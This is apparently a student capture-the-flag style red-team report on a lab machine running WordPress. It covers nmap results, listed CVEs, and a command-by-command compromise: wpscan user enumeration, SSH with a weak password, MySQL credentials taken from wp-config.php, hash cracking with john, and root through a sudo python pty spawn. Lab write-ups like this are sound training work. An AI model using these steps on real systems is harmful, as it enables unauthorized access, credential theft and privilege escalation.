# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap 192.168.1.0/24
```
![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/nmap%20cider%20scan.png)

<br>

This scan identifies the services below as potential points of entry:
- Target 1
  - Port 22/tcp open ssh (service) OpenSSH 6.7p1 Debian 5+deb8u4
  - Port 80/tcp open http (service) Apache httpd 2.4.10 ((Debian))
  - Port 111/tcp open rpcbind (service) 2-4 (RPC #100000)
  - Port 139/tcp open netbios-ssn (services) Samba smbd 3.X - 4.X
  - Port 445/tcp open netbios-ssn (services) Samba smbd 3.X - 4.X


The following vulnerabilities were identified on Target 1:
- Target 1
  - CVE-2021-28041 open SSH (Severity: High)
  - CVE-2017-15710 Apache httpd 2.4.10 (Severity: High)
  - CVE-2017-8779 exploit on open rpcbind port could lead to remote DoS (Severity: High)
  - CVE-2017-7494 Samba NetBIOS (Severity: Critical)


![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/nmap%20-sV%20192.168.1.110.png)

<br>

### Critical Vulnerabilities:
The following vulnerabilities were identified on Target 1:
 
 - Network Mapping
   - nmap scanned for open ports on a designated IP address
   - Attacker can devise an attack based on open ports
 
 - Unsalted Password Hash
   - wpscan is used to gain username information 
   - Attackers gain access the web server

- Weak User Password
  - A user account had a weak password, which was found via guessing
  - Attacker is able to ssh into web server with weak username and password

- Access MySQL Database
  - Attackers discover a file containing MySQL database credentials
  - Attacker can gain access to MySQL database with acquired credentials 

- MySQL Password Extraction
  - Password hashes for user accounts were found by browsing through MySQL tables
  - Attacker can extract password hashes and crack them via john the ripper

- Misconfigured User Privilege Escalation
  - Steven’s account has sudo privileges for python
  - Steven’s Python privileges used to escalate to root   
 
### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:

- Enumerated WordPress site Users with WPScan to obtain username michael, used SSH to get user shell
  - Command used: wpscan --url http://192.168.1.110/wordpress -eu

![Screenshot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/wpscan%20-eu.png)
![Screenshot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/wpscan%20-eu%202.png)

<br>

- Visited the IP address of the target: 192.168.1.110 over HTTP port 80

![Screenshot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/192.168.1.110%20browswer.png)

<br>

- Target 1
  - `flag1.txt`: b9bbcb33e11b80be759c4e844862482d
   - **Exploit Used**
   
    - ssh into Michael's account and look through files in /var/www
    - Command: ssh michael@192.168.1.110
    - The username and password for Michael's account is identical: michael
    - Command: cd ../../var/www
    - Command: ls 
    - Command: grep -RE flag html
     
  
  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/var:www%20and%20ls.png)
  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/grep%20command%20flag%201.png)
  ![ScreenShot](flag1)

<br>


  - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
   - **Exploit Used**
     - Command: ssh michael@192.168.1.110 
     - The username and password for Michael's account is identical: michael
     - Command: locate *flag*
     - Command: cat /var/www/flag2.txt
  
  
  ![ScreenShot](locate *flag*)
  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/flag2.txt.png) 

<br>


  - `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
   - **Exploit Used**
     - Continued using michael shell to find the MySQL database password, logged into MySQL database, and found Flag 3 in wp_posts table.
     - Command: ls /var/www/html/wordpress/
  
  
  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/ls%20wordpress:.png)
  
<br>

   - Command: cat /var/www/html/wordpress/wp-config.php
  
  
  ![ScreenShot](DB Username & Password)

<br>

   - Used the credentials to log into MySQL and dump WordPress user password hashes.
    
     - DB_NAME: wordpress
     - DB_USER: root
     - DB_PASSWORD: R@v3nSecurity
     - Command: mysql -u root -p
 
 
 ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/mysql%20-u%20root%20-p%20command.png)

<br>

   - Search MySQL database for Flag 3 and Wordpress user password hashes:

     - Flag 3 found in wp_posts.
     - Password hashes found in wp_users.
     - Command: show databases;
     - Command: use wordpress;
  
  
  ![ScreenShot](show DB and use wordpress)
  
<br>

   - Command: show tables;
  
  
  ![ScreenShot](show tables;)
  
<br>

   - Command: SELECT * FROM wp_posts;	
  
  
  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/SELECT%20*%20FROM%20wp_posts%201.png)
  ![ScreenShot](select * from wp_posts 2)

<br>

   - Screenshot of Wordpress user password hashes:
    
     - Command: SELECT * FROM wp_users;
  
  
  ![ScreenShot](select * from wp_users;)

<br>

  - `flag4.txt`: 715dea6c055b9fe3337544932f2941ce
   - **Exploit Used**
     - Used john to crack the password hash obtained from MySQL database, secured a new user shell as Steven, escalated to root.
     - Cracking the hashed password using john.
     - Copied password hash from MySQL into ~/root/wp_hashes.txt and cracked with john to discover Steven’s password: pink84.
     - Command: john --show wp_hashes.txt


![ScreenShot](john command)

<br>

   - Secure a user shell as the user whose password you cracked.
    
     - Command: ssh steven@192.168.1.110
     - Password: pink84
     - Escalating to root:
     - Command: sudo -l  
 
 
 ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/sudo%20-l.png)

<br>
   
   - Command: sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
  
  
  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/sudo%20python%20-c%20'import%20pty%3Bpty.spawn(%22:bin:bash%22)'.png)

<br>

   - Search for the root directory for Flag 4.
   
     - Command: cd /root/
     - Command: ls
     - Command: cat flag4.txt


![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/cat%20flag4.txt%201.png)
![ScreenShot](cat flag4.txt 2)

